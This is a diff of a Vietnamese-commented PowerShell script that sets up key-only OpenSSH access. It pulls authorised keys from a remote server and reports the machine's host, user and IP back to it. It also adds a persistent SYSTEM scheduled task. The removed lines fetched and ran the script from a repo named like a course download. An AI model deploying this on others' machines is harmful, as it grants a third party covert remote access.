@@ -1,13 +1,14 @@
 <#
   install_openssh.ps1 — ZERO TOUCH
-  Cach chay: .\install_openssh.ps1   (tu xin quyen Admin)
+  Cach chay: .\install_openssh.ps1
+  Luong: keo public key tu server -> cai OpenSSH -> chi cho phep key -> tu do port/IP/user -> bao cao
+  Luu file bang ASCII hoac UTF-8 co BOM.
 #>
 
-# ==================== CAU HINH ====================
-$SelfUrl           = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
-$ApiBase           = 'https://vm-ssh-manager.onrender.com'
-$FallbackPublicKey = ''
-# ==================================================
+# ==================== CAU HINH (1 DONG DUY NHAT) ====================
+$ApiBase           = 'https://vm-ssh-manager.onrender.com'   # dia chi may chay server.py
+$FallbackPublicKey = ''                            # tuy chon: key du phong khi server chua len
+# ===================================================================
 
 $ErrorActionPreference = 'Stop'
 $NeedRestart = $false
@@ -21,44 +22,20 @@ $pending  = Join-Path $workDir 'pending.json'
 $retryPs1 = Join-Path $workDir 'retry.ps1'
 $taskName = 'VMReportRetry'
 
-# ===== 0. XIN QUYEN ADMIN NGAY LAP TUC =====
-$__id    = [Security.Principal.WindowsIdentity]::GetCurrent()
-$__admin = (New-Object Security.Principal.WindowsPrincipal($__id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $__admin) {
-  # 1. Tim duong dan file that; neu dang chay qua iex thi tu tai ra file
-  $__src = $PSCommandPath
-  if (-not $__src) { $__src = $MyInvocation.MyCommand.Path }
-  if (-not $__src) {
-    $__src = Join-Path $env:TEMP 'install_openssh.ps1'
-    if ($SelfUrl) {
-      try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
-      catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
-    } elseif (-not (Test-Path $__src)) {
-      Write-Host 'Hay luu script thanh file .ps1 roi chay lai.' -ForegroundColor Yellow; throw
-    }
-  }
-  try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
-
-  # 2. Nap noi dung qua -Command, khong can ExecutionPolicy Bypass
-  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
-  Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
-  try {
-    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $__arg -ErrorAction Stop
-  } catch {
-    Write-Host 'Khong nang quyen duoc: ban bam No, hoac may khong co tai khoan admin.' -ForegroundColor Red
-    Write-Host 'Kiem tra bang lenh: net localgroup Administrators' -ForegroundColor Yellow
-    throw
-  }
-  return   # KHONG dung exit - exit se dong luon cua so cua ban
+# ===== 0. Quyen admin =====
+$pr = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+  if (-not $PSCommandPath) { Write-Host 'Hay luu thanh file .ps1 roi chay bang PowerShell (Run as Administrator).' -ForegroundColor Yellow; exit 1 }
+  Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+  exit
 }
-# ===== het khoi xin quyen =====
 
-# ===== 1. Tu keo PUBLIC KEY tu server =====
+# ===== 1. Tu keo PUBLIC KEY tu server (co retry cho may moi boot) =====
 Write-Host '=== 1/4: Lay public key tu server ===' -ForegroundColor Cyan
 $keys = @()
 for ($i = 1; $i -le 6; $i++) {
   try {
-    $r = Invoke-RestMethod -Uri $KeysUrl -Method Get -TimeoutSec 60 -UseBasicParsing
+    $r = Invoke-RestMethod -Uri $KeysUrl -Method Get -TimeoutSec 10 -UseBasicParsing
     $keys = @($r.keys | Where-Object { $_ -match $KeyPattern })
     if ($keys.Count -gt 0) { break }
     Write-Host "  Lan $i/6: server chua co key hop le." -ForegroundColor Yellow
@@ -72,8 +49,8 @@ if ($keys.Count -eq 0 -and $FallbackPublicKey -match $KeyPattern) {
   Write-Host '  Dung key du phong khai bao trong file.' -ForegroundColor Yellow
 }
 if ($keys.Count -eq 0) {
-  Write-Host '[LOI] Khong lay duoc public key nao -> DUNG, khong dong vao SSH.' -ForegroundColor Red
-  Write-Host ('      Kiem tra: ' + $KeysUrl + ' phai tra ve {"keys":[...]} chua it nhat 1 key.') -ForegroundColor Yellow
+  Write-Host '[LOI] Khong lay duoc public key nao -> DUNG, khong dong vao SSH (tranh tu khoa minh ngoai cua).' -ForegroundColor Red
+  Write-Host "      Kiem tra: $KeysUrl phai tra ve {\"keys\":[...]} chua it nhat 1 key." -ForegroundColor Yellow
   exit 1
 }
 Write-Host "  Da lay $($keys.Count) public key." -ForegroundColor Green
@@ -154,6 +131,7 @@ New-ItemProperty -Path 'HKLM:\SOFTWARE\OpenSSH' -Name DefaultShell -Value "$env:
 Write-Host '=== 4/4: Tu do port/IP, mo firewall & bao cao ===' -ForegroundColor Cyan
 $ErrorActionPreference = 'Continue'
 
+# 4a. Cau hinh hieu luc + port that cua sshd
 $eff = $null; $ports = @(22)
 try {
   $eff = & $sshdExe -T -C "user=$env:USERNAME,host=localhost,addr=127.0.0.1" 2>$null
@@ -173,6 +151,7 @@ try {
 $sshPort = $ports[0]
 Write-Host "  Port SSH thuc te: $($ports -join ', ')" -ForegroundColor Green
 
+# 4b. Firewall theo dung port
 foreach ($p in $ports) {
   $ruleName = if ($p -eq 22) { 'OpenSSH-Server-In-TCP' } else { "OpenSSH-Server-In-TCP-$p" }
   if (Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue) { Enable-NetFirewallRule -Name $ruleName | Out-Null }
@@ -181,6 +160,7 @@ foreach ($p in $ports) {
   else { Write-Host "  CANH BAO: cong $p chua LISTEN." -ForegroundColor Red }
 }
 
+# 4c. IP that (uu tien card giu default route)
 $validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
 $primaryIP = $null
@@ -197,6 +177,7 @@ $ErrorActionPreference = 'Stop'
 Write-Host "  User SSH: $env:USERNAME | IP chinh: $primaryIP" -ForegroundColor Green
 foreach ($ipObj in $validIPs) { Write-Host "  Tu laptop:  ssh -p $sshPort $env:USERNAME@$($ipObj.IPAddress)" -ForegroundColor Green }
 
+# 4d. Bao cao (retry) + task tu gui lai neu that bai
 New-Item -ItemType Directory -Force -Path $workDir | Out-Null
 $payload = @{
   vm_name    = $env:COMPUTERNAME
@@ -212,7 +193,7 @@ if ($primaryIP) {
   for ($i = 1; $i -le 3; $i++) {
     try {
       $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
-      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
+      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -UseBasicParsing
       Write-Host "[SUCCESS] $($resp.message)" -ForegroundColor Green
       $sent = $true; break
     } catch {
@@ -235,21 +216,20 @@ $u = '__URL__'
 $f = '__FILE__'
 try {
   $b = [System.Text.Encoding]::UTF8.GetBytes((Get-Content -Raw $f))
-  Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing | Out-Null
+  Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -UseBasicParsing | Out-Null
   Remove-Item $f -Force -ErrorAction SilentlyContinue
   Unregister-ScheduledTask -TaskName 'VMReportRetry' -Confirm:$false -ErrorAction SilentlyContinue
 } catch { exit 1 }
 '@
   $retryBody = $retryBody.Replace('__URL__', $ReportUrl).Replace('__FILE__', $pending)
   Set-Content -Path $retryPs1 -Value $retryBody -Encoding Ascii
-  $taskArg = '-NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $retryPs1 + '''))"'
-  $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $taskArg
+  $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$retryPs1`""
   $t1 = New-ScheduledTaskTrigger -AtStartup
   $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 30)
   $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
   $sett = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
   Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $t1,$t2 -Principal $prin -Settings $sett -Force | Out-Null
-  Write-Host "[PENDING] Da luu payload + tao task '$taskName' tu gui lai moi 5 phut." -ForegroundColor Yellow
+  Write-Host "[PENDING] Da luu payload + tao task '$taskName' tu gui lai moi 5 phut (tu xoa khi thanh cong)." -ForegroundColor Yellow
 }
 
 if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH (thuong thi khong can).' -ForegroundColor Yellow }
